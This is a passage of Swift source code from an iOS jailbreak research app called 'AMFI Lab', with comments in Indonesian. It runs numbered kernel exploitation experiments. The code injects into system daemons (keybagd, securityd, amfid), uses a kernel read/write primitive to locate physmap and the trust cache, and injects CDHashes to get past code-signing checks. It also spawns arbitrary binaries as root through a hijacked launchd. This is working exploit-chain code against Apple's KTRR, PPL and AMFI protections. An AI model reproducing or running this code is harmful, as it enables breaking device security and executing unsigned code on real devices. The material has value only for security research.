                    action: { runSBExperiment(label: "keybagd", exp: expKeybagdInject) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑥ securityd system() (Exp 108)",
                    icon: "lock.trianglebadge.exclamationmark",
                    color: .red,
                    label: "securityd",
                    action: { runSBExperiment(label: "securityd", exp: expSecuritydInject) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑦ amfid XPC Overflow (Exp 109)",
                    icon: "ant.circle.fill",
                    color: .purple,
                    label: "amfid OVF",
                    action: { runSBExperiment(label: "amfid OVF", exp: expAmfidOverflow) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑧ MSM LoadTrustCache (Exp 110)",
                    icon: "checkmark.seal.fill",
                    color: .green,
                    label: "MSM TC",
                    action: { runSBExperiment(label: "MSM TC", exp: expMSMLoadTrustCache) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑨ MSM Debug TC Load (Exp 111)",
                    icon: "ladybug.fill",
                    color: .red,
                    label: "Debug TC",
                    action: runExp111MSMDebugTC,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑨a MSM MountImage Debug (Exp 111A)",
                    icon: "externaldrive.fill",
                    color: .orange,
                    label: "111A",
                    action: { runSBExperiment(label: "111A", exp: expMSM111A) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑨b MSM ImageTrustCache (Exp 111B)",
                    icon: "doc.badge.plus",
                    color: .orange,
                    label: "111B",
                    action: { runSBExperiment(label: "111B", exp: expMSM111B) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑨c MSM TC File Path (Exp 111C)",
                    icon: "folder.badge.plus",
                    color: .orange,
                    label: "111C",
                    action: { runSBExperiment(label: "111C", exp: expMSM111C) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑨d MSM Personalize Debug (Exp 111D)",
                    icon: "person.badge.key.fill",
                    color: .orange,
                    label: "111D",
                    action: { runSBExperiment(label: "111D", exp: expMSM111D) },
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "⑩ TC Load + Spawn Test (Exp 112)",
                    icon: "bolt.circle.fill",
                    color: .green,
                    label: "TC+Spawn",
                    action: runExp112TCLoadSpawn,
                    needsVerified: false,
                    needsProbe: false
                )

                pathButton(
                    title: "④ Test Binary Spawn",
                    icon: "terminal.fill",
                    color: .indigo,
                    label: "Spawn",
                    action: { testSingleBinary(customBinary) },
                    needsVerified: false
                )

                TextField("Binary path", text: $customBinary)
                    .font(.system(.caption, design: .monospaced))
            } header: {
                Label("Jailbreak Path", systemImage: "flag.checkered")
            } footer: {
                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR). ③f amfid Patch: patch amfid text via physmap untuk skip signature check.")
                    .font(.system(size: 9))
            }
            
            // Results
            if !results.isEmpty {
                Section {
                    ForEach(results) { r in
                        VStack(alignment: .leading, spacing: 4) {
                            HStack {
                                Image(systemName: r.success ? "checkmark.circle.fill" : "xmark.circle.fill")
                                    .foregroundStyle(r.success ? .green : .red)
                                Text(r.name)
                                    .font(.caption.bold())
                                Spacer()
                                Text(r.timestamp, style: .time)
                                    .font(.system(size: 8))
                                    .foregroundStyle(.tertiary)
                            }
                            Text(r.detail)
                                .font(.system(size: 10, design: .monospaced))
                                .foregroundStyle(.secondary)
                                .textSelection(.enabled)
                        }
                        .padding(.vertical, 2)
                    }
                } header: {
                    HStack {
                        Label("Results (\(results.count))", systemImage: "list.bullet")
                        Spacer()
                        if !results.isEmpty {
                            Button("Clear") { results.removeAll() }
                                .font(.caption2)
                        }
                    }
                }
            } else if !isRunning {
                Section {
                    Text("No results yet. Tap 'Run All' to start.")
                        .font(.caption)
                        .foregroundStyle(.secondary)
                } header: {
                    Label("Results", systemImage: "list.bullet")
                }
            }
        }
        .navigationTitle("AMFI Lab")
        .navigationBarTitleDisplayMode(.inline)
    }

    @ViewBuilder
    private func pathButton(
        title: String,
        icon: String,
        color: Color,
        label: String,
        action: @escaping () -> Void,
        needsVerified: Bool,
        needsProbe: Bool = false
    ) -> some View {
        Button(action: action) {
            HStack {
                Label(title, systemImage: icon)
                    .foregroundStyle(isRunning ? .gray : color)
                Spacer()
                if isRunning && runningLabel.contains(label) {
                    ProgressView().scaleEffect(0.7)
                }
            }
        }
        .disabled(
            isRunning || !mgr.dsready
                || (needsVerified && !PhysmapConstants.isVerified)
                || (needsProbe && !PhysmapConstants.isProbeOK)
        )
    }

    // MARK: - Jailbreak path runners

    private func runExperiment(
        label: String,
        operation: String,
        append: Bool = false,
        block: @escaping (RemoteCall) -> ExperimentResult
    ) {
        isRunning = true
        runningLabel = label

        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: operation) { rc in
            let result = block(rc)
            DispatchQueue.main.async {
                if append {
                    self.results.insert(result, at: 0)
                } else {
                    self.results = [result]
                }
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    /// Exp 74 is KRW-only — must NOT hold launchd (IOSurface + long KRW = initproc panic).
    private func runExp74() {
        isRunning = true
        runningLabel = "Physmap"
        guard mgr.dsready else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expPhysmapAccess()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Probe = KRW-only (no launchd). sysctl/RC was causing 3+ min hangs with no UI update.
    private func runExp77Probe() {
        isRunning = true
        runningLabel = "TC Probe"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheProbeSafe()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Inject = KRW-only (no launchd). Validates physmap VA before any write.
    private func runExp77Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expTrustCacheWrite(rc: nil, dryRun: false)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 80: RC Trust Cache Add via launchd RemoteCall.
    /// Ini jalur PPL-safe: panggil trust_cache_runtime_add dari launchd context.
    /// PPL yang melakukan write internal — tidak ada KTRR fault.
    private func runExp80RCTrustCacheAdd() {
        isRunning = true
        runningLabel = "RC TC Add"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "exp80_rc_tc_add") { rc in
            let result = self.expRCTrustCacheAdd(rc: rc)
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail.prefix(80).description, 0)
        }
        #else
        isRunning = false
        runningLabel = ""
        #endif
    }

    private func runExp81HeapTCAnalysis() {
        isRunning = true
        runningLabel = "Heap TC"
        guard mgr.dsready, PhysmapConstants.isVerified else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expHeapTCAnalysis()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 79 Tahap 1: Write test — tulis sentinel ke slot kosong, verify, restore.
    /// Tidak memodifikasi entry yang ada. Aman untuk dijalankan.
    private func runExp79WriteTest() {
        isRunning = true
        runningLabel = "Write Test"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expWriteTest()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }

    /// Exp 79 Tahap 2: CDHash inject — hanya jika write test sukses.
    private func runExp79Inject() {
        isRunning = true
        runningLabel = "TC Inject"
        guard mgr.dsready, PhysmapConstants.isVerified, PhysmapConstants.isProbeOK else {
            isRunning = false
            runningLabel = ""
            return
        }
        guard probedTCAddr != 0 else {
            results.insert(ExperimentResult(
                name: "TC Inject (Exp 79)",
                success: false,
                detail: "❌ Jalankan Write Test dulu — tc_addr belum diset.\nProbe ulang Exp 77 jika perlu.",
                timestamp: Date()
            ), at: 0)
            isRunning = false
            runningLabel = ""
            return
        }
        DispatchQueue.global(qos: .userInitiated).async {
            let result = self.expInjectCDHash()
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
        }
    }
    
    private func testSingleBinary(_ path: String) {
        isRunning = true
        runningLabel = "Testing \(path)..."
        
        #if !DISABLE_REMOTECALL
        root.executeAsRoot(operation: "test_binary") { rc in
            let result = self.expPosixSpawn(rc: rc, binary: path, name: "posix_spawn \(path)")
            DispatchQueue.main.async {
                self.results.insert(result, at: 0)
                self.isRunning = false
                self.runningLabel = ""
            }
            return (result.success, result.detail, 0)
        }
        #endif
    }
    
    // MARK: - Experiment Implementations
    
    #if !DISABLE_REMOTECALL
    /// Helper: posix_spawn a binary
    private func expPosixSpawn(rc: RemoteCall, binary: String, name: String) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, binary)
        
        // argv = [binary, NULL]
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // pid output
        let pidAddr = mem + 0x300
        rc[pidAddr].setValue32(0)
        
        // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
        let pid = rc[pidAddr].value32()
        
        // If spawned, wait for it
        if ret == 0 && pid != 0 {
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(pid), statusAddr, 0)
            let exitStatus = rc[statusAddr].value32()
            
            RootExecutor.rcall(rc, "free", binAddr)
            return ExperimentResult(
                name: name,
                success: true,
                detail: "âœ… PID=\(pid), exit=\(exitStatus >> 8), ret=\(ret)",
                timestamp: Date()
            )
        }
        
        // Failed â€” get errno
        let err = remote_errno(rc)
        RootExecutor.rcall(rc, "free", binAddr)
        return ExperimentResult(
            name: name,
            success: false,
            detail: "âŒ ret=\(ret), errno=\(err), pid=\(pid)",
            timestamp: Date()
        )
    }
    

    // MARK: - Dead-end experiments 54-73 REMOVED (IOKit probe, CoreTrust, PPL, physical memory)
    // Semua sudah terbukti gagal karena KTRR/PPL hardware protection.
    // Lihat conversation.md untuk detail.

    // MARK: - Experiment 74: Physmap Direct Access
    
    /// The kernel maintains a 1:1 virtual mapping of ALL physical RAM (physmap).
    /// Formula: physmap_virt = physmap_base + physical_address
    /// If we can find physmap_base, we can read/write ANY physical address
    /// through the kernel's own virtual mapping — bypassing zone isolation!
    ///
    /// Key insight: physmap is in kernel __DATA region, NOT in a PPL-protected zone.
    /// Our socket KRW might be able to read it IF the address falls in our zone.
    /// Alternative: use the known gPhysBase/gVirtBase to calculate.
    ///
    /// On A12 iOS 18.2:
    ///   physmap_base ≈ 0xfffffff000000000 (gVirtBase) - 0x800000000 (gPhysBase) + kernel_base
    ///   OR: physmap is at a fixed offset from kernel base
    /// Pure KRW — no launchd RC, no IOKit/IOSurface (prevents initproc panic).
    private func expPhysmapAccess() -> ExperimentResult {
        var detail = "Experiment 74: Physmap Direct Access (KRW-only, safe)\n"
        detail += "====================================================\n\n"

        // Sudah verified (screenshot lama / run sukses) — jangan ulang probe yang bikin panic/respring
        if PhysmapConstants.isVerified, let saved = PhysmapConstants.load() {
            let kernBase = ds_get_kernel_base()
            let magic = ds_kread64_safe(kernBase)
            let machOk = (magic & 0xFFFFFFFF) == 0xFEEDFACF
            detail += "✅ Sudah verified sebelumnya — skip probe ulang\n"
            detail += "gVirtBase: 0x\(String(format: "%llx", saved.gVirtBase))\n"
            detail += "gPhysBase: 0x\(String(format: "%llx", saved.gPhysBase))\n"
            detail += "KRW __TEXT sekarang: \(machOk ? "OK (0xFEEDFACF)" : "⚠️ cek jailbreak")\n\n"
            detail += "→ Fokus berikutnya: ② Trust Cache Probe (Exp 77)\n"
            detail += "Jangan tap ③ Inject sampai ② hijau.\n"
            return ExperimentResult(name: "Physmap Access (Exp 74)", success: machOk, detail: detail, timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let gPhysBase: UInt64 = PhysmapConstants.defaultGPhysBase
        let ourProc = ds_get_our_proc()
        let zoneMapEst = PhysmapConstants.estimateZoneMapBase(ourProc: ourProc)
        detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
        detail += "Zone map (est): 0x\(String(format: "%llx", zoneMapEst))\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"

        // Step 2: Test if socket KRW can read OUTSIDE proc/task zone
        // Key question: is our KRW truly zone-limited, or can it read any kernel VA?
        // Test by reading kernel __TEXT header (Mach-O magic) — different zone from proc
        
        detail += "\n=== Testing KRW zone boundaries ===\n"
        
        // Read kernel Mach-O header (should be 0xFEEDFACF for 64-bit)
        let kernMagic = ds_kread64_safe(kernBase)
        detail += "Kernel base read: 0x\(String(format: "%llx", kernMagic))\n"
        
        let isMachO = (kernMagic & 0xFFFFFFFF) == 0xFEEDFACF
        if isMachO {
            detail += "✅ Kernel Mach-O header readable! (0xFEEDFACF)\n"
            detail += "KRW can read __TEXT segment!\n\n"
        } else if kernMagic == 0 {
            detail += "❌ Kernel base returns 0 — zone-blocked\n\n"
        } else {
            detail += "⚠️ Unexpected value — might be slid or different format\n\n"
        }
        
        // ============================================================
        // PRIMARY: kernproc pmap → tte/ttep (+0x00 or +0x08, PAC stripped)
        // User pmap (our_proc) often has tte=0 at +0x00 — see prior experiments.
        // ============================================================
        var foundPhysBase: UInt64 = 0
        var foundVirtBase: UInt64 = 0

        if let verified = verifyPhysmapSafe(
            kernBase: kernBase,
            kernMagic: kernMagic,
            ourProc: ourProc,
            tte: 0,
            detail: &detail
        ) {
            foundVirtBase = verified.gVirtBase
            foundPhysBase = verified.gPhysBase
        }

        let success = foundPhysBase != 0 && foundVirtBase != 0
        return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 77: Trust Cache Probe (safe) + Inject (physmap)

    /// Fast kernelcache-guided probe: symtab → few __DATA slots → optional short fallback.
    private func expTrustCacheProbeSafe() -> ExperimentResult {
        let expName = "Trust Cache Probe (Exp 77)"
        var detail = "Experiment 77: Trust Cache Probe (read-only, KRW-safe)\n"
        detail += "====================================================\n\n"
        detail += "Mode: offline kernelcache ADRP + KRW aman (analyze_kernelcache.py di device)\n\n"

        guard PhysmapConstants.isVerified else {
            detail += "❌ Jalankan Physmap Access (Exp 74) dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        PhysmapConstants.clearProbeOK()

        let physmap = PhysmapConstants.loadOrDefault()
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()
        detail += "gVirtBase: 0x\(String(format: "%llx", physmap.gVirtBase)) (saved)\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", physmap.gPhysBase))\n"
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "Kernel slide: 0x\(String(format: "%llx", kernSlide))\n\n"

        let fileDataOffForBase = ds_kcache_analyze_data_offset()
        let dataOff = fileDataOffForBase != 0 ? fileDataOffForBase : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData
        detail += "__DATA: 0x\(String(format: "%llx", dataSegBase))\n"
        detail += "__DATA.__ppl_data: 0x\(String(format: "%llx", pplDataBase)) (TIDAK dibaca — PPL panic)\n"

        let offlineSlotCount = ds_kcache_trust_slot_count()
        let fileDataOff = fileDataOffForBase
        detail += "\n=== Offline kernelcache scan ===\n"
        detail += "  ADRP slots: \(offlineSlotCount) (dari file Documents/kernelcache)\n"
        if fileDataOff != 0 {
            detail += "  dataOffsetFromText: 0x\(String(format: "%llx", fileDataOff))"
            if fileDataOff != PhysmapConstants.dataOffsetFromText {
                detail += " (builtin 0x\(String(format: "%llx", PhysmapConstants.dataOffsetFromText)))"
            }
            detail += "\n"
        }
        if offlineSlotCount == 0 {
            detail += "  ⚠️ Jalankan Import/Verifikasi kernelcache dulu (Settings).\n"
        }
        detail += "\n"

        var probeOffsets: [UInt64] = []
        if offlineSlotCount > 0 {
            for i in 0..<offlineSlotCount {
                let off = ds_kcache_trust_slot_at(i)
                if off != 0 { probeOffsets.append(off) }
            }
        }
        if probeOffsets.isEmpty {
            probeOffsets = PhysmapConstants.trustCacheFastOffsetsInData
        }

        var tcStructAddr: UInt64 = 0
        var tcEntryCount: UInt64 = 0
        var krwBudget = 512

        func spendKRW() -> Bool {
            if krwBudget <= 0 { return false }
            krwBudget -= 1
            return true
        }

        func readU32(_ va: UInt64) -> UInt32 {
            if isSafeKernelHeapKreadAddress(va) { return safeKread32Heap(va) }
            return safeKread32Kernel(va)
        }

        func trustCacheHeaderAt(_ va: UInt64, headerOff: UInt64 = 0) -> (UInt32, UInt32)? {
            guard spendKRW(),
                  isSafeTrustCacheStructVA(va, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return nil }
            let base = va &+ headerOff
            let ver = readU32(base)
            let cnt = readU32(base + 4)
            // count >= 5: trust cache sistem selalu punya banyak entry
            // count < 5 = false positive (struct lain yang kebetulan lolos)
            guard cnt >= 5 && cnt < 500_000 else { return nil }
            if ver >= 1 && ver <= 16 { return (ver, cnt) }
            return nil
        }

        func tryTrustCacheAt(_ val: UInt64, label: String) -> Bool {
            for hdrOff: UInt64 in [0, 8, 0x10, 0x18, 0x20] {
                if let (tcVer, tcCnt) = trustCacheHeaderAt(val, headerOff: hdrOff) {
                    let hdrVA = val &+ hdrOff
                    guard trustCacheEntriesPlausible(
                        hdrVA: hdrVA, count: tcCnt,
                        dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase
                    ) else {
                        detail += "  (abaikan \(label)+0x\(String(format: "%x", hdrOff)): ver=\(tcVer) cnt=\(tcCnt) — entry[0] bukan CDHash)\n"
                        continue
                    }
                    let kind = isSafeKernelHeapKreadAddress(val) ? "heap" : "__DATA"
                    detail += "🎯 Trust cache \(label) (\(kind))!\n"
                    detail += "  addr: 0x\(String(format: "%llx", hdrVA))\n"
                    detail += "  version: \(tcVer), count: \(tcCnt)\n"
                    tcStructAddr = hdrVA
                    tcEntryCount = UInt64(tcCnt)
                    return true
                }
            }
            guard isLikelyKernelObjectPointer(val),
                  isSafeTrustCacheFollowPointer(val, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
                || isLikelyTrustCacheHeapPointer(val, kernTextBase: kernBase)
            else { return false }
            guard spendKRW() else { return false }
            let inner = ds_kreadptr(val)
            guard inner != 0, inner != val, isLikelyKernelObjectPointer(inner),
                  isSafeTrustCacheFollowPointer(inner, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return false }
            return tryTrustCacheAt(inner, label: "\(label)→deref")
        }

        func probeGlobalSlot(_ off: UInt64, label: String) {
            let addr = dataSegBase &+ off
            guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase)
            else { return }
            if off != PhysmapConstants.pmapCsAllowInvalidOffsetInData {
                if tryTrustCacheAt(addr, label: "\(label)@inline") { return }
            }
            guard spendKRW() else { return }
            let raw = safeKread64Kernel(addr)
            let val = ds_kreadptr(addr)
            let use = val != 0 ? val : raw
            guard isLikelyKernelObjectPointer(use) else { return }
            if tryTrustCacheAt(use, label: label) { return }
            if isSafeTrustCacheFollowPointer(use, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
               spendKRW() {
                let smr = ds_kreadsmrptr(addr)
                if smr != 0, smr != use, isLikelyKernelObjectPointer(smr) {
                    _ = tryTrustCacheAt(smr, label: "\(label)→smr")
                }
            }
        }

        detail += "=== Symtab / XPF globals ===\n"
        let symProbeNames = [
            "_trustcache",
            "_static_trust_cache",
            "_loaded_trust_caches",
            "kernelSymbol.trust_cache",
        ]
        for sym in symProbeNames {
            var rt = ds_kcache_symbol_runtime(sym)
            if rt == 0 { rt = ds_xpf_resolve_runtime(sym) }
            if rt == 0 {
                detail += "  \(sym): (not found)\n"
                continue
            }
            detail += "  \(sym): 0x\(String(format: "%llx", rt))\n"
            if tryTrustCacheAt(rt, label: sym) { break }
            if spendKRW() {
                let p = ds_kreadptr(rt)
                if isLikelyKernelObjectPointer(p) {
                    if tryTrustCacheAt(p, label: "\(sym)→ptr") { break }
                }
            }
        }
        detail += "\n"

        var orderedOffsets = probeOffsets
        // Prioritas berdasarkan analisis offline (analyze_kernelcache.py --deep-probe):
        // 0x39b0 dan 0x38a0 = slot yang di-STR oleh kode kernel (trust_cache_init area)
        // 0x3980, 0x3920, 0x3930 = ADRP refs tinggi dari AMFI code
        let priority: [UInt64] = [
            0x39b0, 0x38a0,           // ← STR target dari kernel init code (highest priority)
            0x3980, 0x3920, 0x3930,   // ← ADRP refs tinggi
            0x38e0, 0x38c0, 0x38b0, 0x3900,
            0x2d0, 0x1a4, 0x2770, 0x1f8,
        ]
        orderedOffsets.sort { a, b in
            let pa = priority.firstIndex(of: a) ?? 999
            let pb = priority.firstIndex(of: b) ?? 999
            if pa != pb { return pa < pb }
            return a < b
        }
        orderedOffsets.removeAll { $0 == PhysmapConstants.pmapCsAllowInvalidOffsetInData }

        detail += "=== Probe __DATA (\(orderedOffsets.count) slot, pre-PPL) ===\n"
        for off in orderedOffsets {
            probeGlobalSlot(off, label: "kc+0x\(String(format: "%x", off))")
            if tcStructAddr != 0 { break }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Pointer di global __DATA (read-only) ===\n"
            for off in probeOffsets.prefix(8) {
                let addr = dataSegBase &+ off
                guard isSafeTrustCacheStructVA(addr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { continue }
                let p = ds_kreadptr(addr)
                let raw = safeKread64Kernel(addr)
                let show = p != 0 ? p : raw
                var tag: String
                if show == 0 { tag = "null" }
                else if isSafeKernelHeapKreadAddress(show) { tag = "heap?" }
                else if show >= dataSegBase && show < pplDataBase { tag = "__DATA" }
                else if isFilesetAuxDataVA(show, kernTextBase: kernBase, dataSegBase: dataSegBase) { tag = "fileset aux" }
                else if show >= kernBase && show < dataSegBase { tag = "__TEXT? (skip)" }
                else { tag = "?" }
                if p == 0 && raw != 0 { tag += " raw" }
                detail += "  kc+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", show)) (\(tag))\n"
            }
        }

        if tcStructAddr == 0 {
            detail += "\n=== Scan fileset aux (pointer dari slot) ===\n"
            var auxSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(16) {
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isFilesetAuxDataVA(p, kernTextBase: kernBase, dataSegBase: dataSegBase),
                      auxSeen.insert(p).inserted
                else { continue }
                detail += "  follow aux 0x\(String(format: "%llx", p))\n"
                if tryTrustCacheAt(p, label: "aux") { break }
            }
        }

        // === Heap deep scan: ikuti pointer dari __DATA ke heap, lalu scan +0..+0x80 ===
        // Trust cache iOS 18 sering ada di heap (kalloc), bukan inline __DATA.
        // Pointer di __DATA → heap object → trust cache struct di dalam object itu.
        if tcStructAddr == 0 {
            detail += "\n=== Heap deep scan (pointer __DATA → heap object) ===\n"
            var heapSeen = Set<UInt64>()
            for off in orderedOffsets.prefix(24) {
                guard tcStructAddr == 0 else { break }
                let addr = dataSegBase &+ off
                guard spendKRW() else { break }
                let p = ds_kreadptr(addr)
                guard isLikelyKernelObjectPointer(p),
                      isSafeKernelHeapKreadAddress(p),
                      heapSeen.insert(p).inserted
                else { continue }
                // Scan +0x00..+0x80 dari heap object untuk cari trust cache header
                for innerOff: UInt64 in [0, 8, 0x10, 0x18, 0x20, 0x28, 0x30, 0x40, 0x48, 0x50, 0x60, 0x70, 0x80] {
                    guard spendKRW() else { break }
                    let candidate = p &+ innerOff
                    guard isSafeKernelHeapKreadAddress(candidate) else { continue }
                    if tryTrustCacheAt(candidate, label: "heap+0x\(String(format: "%x", innerOff))@kc+0x\(String(format: "%x", off))") {
                        break
                    }
                    // Juga ikuti pointer di dalam heap object
                    let inner = ds_kreadptr(candidate)
                    guard isLikelyKernelObjectPointer(inner),
                          isSafeKernelHeapKreadAddress(inner),
                          inner != p
                    else { continue }
                    if tryTrustCacheAt(inner, label: "heap→inner@kc+0x\(String(format: "%x", off))") { break }
                }
            }
        }

        guard tcStructAddr != 0 else {
            detail += "\n❌ Struct trust cache tidak ditemukan.\n"
            detail += "Kernelcache OK (\(offlineSlotCount) slot). Perbaikan band KRW 0xffffff80… aktif.\n"
            detail += "Jika masih gagal: Import ulang kernelcache + Jailbreak, kirim log slot di atas.\n"
            detail += "Jangan tap ③ Inject.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        func tcRead64(_ va: UInt64) -> UInt64 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread64Heap(va) : safeKread64Kernel(va)
        }
        func tcRead32(_ va: UInt64) -> UInt32 {
            isSafeKernelHeapKreadAddress(tcStructAddr) ? safeKread32Heap(va) : safeKread32Kernel(va)
        }

        // === Raw struct dump (64 bytes) — untuk diagnosa layout iOS 18 ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) {
            detail += "\n=== Raw struct dump (64 bytes dari tcStructAddr) ===\n"
            for dumpOff in stride(from: UInt64(0), to: 64, by: 8) {
                let dumpVA = tcStructAddr &+ dumpOff
                guard isSafeTrustCacheStructVA(dumpVA, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                let val = tcRead64(dumpVA)
                detail += "  +0x\(String(format: "%02x", dumpOff)): 0x\(String(format: "%016llx", val))\n"
            }
            detail += "\n"
        }

        // === Sample entries (KRW, max 3) — coba berbagai stride ===
        if isSafeTrustCacheStructVA(tcStructAddr, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase),
           tcEntryCount > 0 {
            detail += "=== Sample entries (KRW, max 3) ===\n"
            // iOS 18 trust cache entry: kemungkinan 24 bytes (CDHash 20B + hashType 1B + flags 1B + pad 2B)
            // atau 32 bytes. Coba stride 24 dan 32.
            for stride in [UInt64(24), UInt64(32), UInt64(22)] {
                let entriesStart = tcStructAddr &+ 8
                guard isSafeTrustCacheStructVA(entriesStart, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                detail += "  [stride=\(stride)]:\n"
                for i in 0..<min(3, Int(tcEntryCount)) {
                    let entryAddr = entriesStart &+ UInt64(i) * stride
                    guard isSafeTrustCacheStructVA(entryAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else { break }
                    let h0 = tcRead64(entryAddr)
                    let h1 = tcRead64(entryAddr &+ 8)
                    let h2 = tcRead32(entryAddr &+ 16)
                    detail += "    [\(i)] 0x\(String(format: "%016llx", h0)) 0x\(String(format: "%016llx", h1)) 0x\(String(format: "%08x", h2))\n"
                }
            }
        }

        detail += "\n✅ PROBE OK — trust cache ditemukan (tanpa physmap read).\n"
        detail += "Lanjut ke ③ Write Test untuk verifikasi apakah __DATA bisa ditulis via KRW.\n"
        PhysmapConstants.markProbeOK()

        // Simpan hasil probe ke state untuk dipakai Exp 79
        let savedAddr = tcStructAddr
        let savedCount = UInt32(tcEntryCount)
        DispatchQueue.main.async {
            self.probedTCAddr = savedAddr
            self.probedTCCount = savedCount
            self.probedTCStride = 24  // default; update jika stride 32 terbukti lebih baik
        }

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 81: Heap TC Analysis
    
    private func expHeapTCAnalysis() -> ExperimentResult {
        let expName = "Heap TC Analysis (Exp 81)"
        var detail = "Experiment 81: Heap Pointer Analysis\n"
        detail += "=====================================\n\n"

        guard PhysmapConstants.isVerified else {
            return ExperimentResult(name: expName, success: false, detail: "Jalankan Physmap Access (Exp 74) dulu.", timestamp: Date())
        }

        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n"
        detail += "__DATA base: 0x\(String(format: "%llx", dataSegBase))\n\n"

        let targetOffsets: [UInt64] = [0x39b0, 0x38a0]
        var foundHeapStructs = 0
        
